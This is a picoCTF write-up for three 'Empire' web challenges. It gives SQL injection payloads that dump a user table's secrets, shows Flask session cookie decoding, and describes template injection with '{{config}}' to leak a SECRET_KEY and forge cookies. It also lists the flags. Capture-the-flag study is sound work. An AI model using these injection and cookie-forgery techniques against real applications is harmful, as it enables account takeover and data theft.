# Empire1

Once you create an account, you can add a todo. After trying multiple payloads, you can see that the application is vulnerable to SQL injection.

First, let's list all tables:
```
'||(SELECT group_concat(tbl_name) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%')||'
```

Result:
```
user,todo
```

Then we can print sql query for `user` table:
```
'||(SELECT sql FROM sqlite_master  WHERE type='table' and tbl_name='user' )||'
```

Result:
```
CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) )
```

Finally we can select users secrets:
```
'||(SELECT group_concat(secret) from user)||'
```

Result:
```
Likes Oreos.,Know it all.,picoCTF{wh00t_it_a_sql_injecta4dfbd62}
```

Flag: `picoCTF{wh00t_it_a_sql_injecta4dfbd62}`

# Empire2

To solve this challenge you need [flask session cookie decoder](https://github.com/noraj/flask-session-cookie-manager).

```
$ python3 flask_session_cookie_manager3.py decode -c '.eJwljzFuwzAMRe-i
OQNFyhKVtUBP0F2gRKo10taBbA9FkLtXRdcPvIf3H670YfuHux7jtIsrq7qr69SCt4RmLF4ptag5EjFBAsK4SENckuQeY5BWM5BnpRC5LuxDYw60KLRsWBlq0CUwgs-5kv6pU1VUIDUwQzSRgBoEjKEReWB0F9f20cux3ex79tQeV
Cpqq8YdwEdl9ll8pjC9VjtqojlPTmXcym5t2DHB-9q2l7fXx3rsRcqXlZ_tHKV_yjvkHLpIfE7m3G38Hyf3_AXMLFCO.XhSiCA.fmxajatcgwlv_iluy9z-i3UOaok'
b'{"_fresh":true,"_id":"f3c41e72ee8a1d37c6d9633830703265ac2257a9f664acb90318d3468b5814c88435d0c9e2b80b4d54820199b3df3c47bd2d03de0ee22eaa42d4a0e80c331082","csrf_token":"bf4dab2dcbe8f0016d8819a1934201ebf2d73016","dark_secret":"picoCTF{its_a_me_your_flag0994faa6}","user_id":"3"}'
```

Flag: `picoCTF{its_a_me_your_flag0994faa6}`

# Empire3

First, create `{{config}}` todo. Once you get `SECRET_KEY` you can forge any cookies you want.

[flask server](flask3.py)

Flag: `picoCTF{cookies_are_a_sometimes_food_a8b9006b}`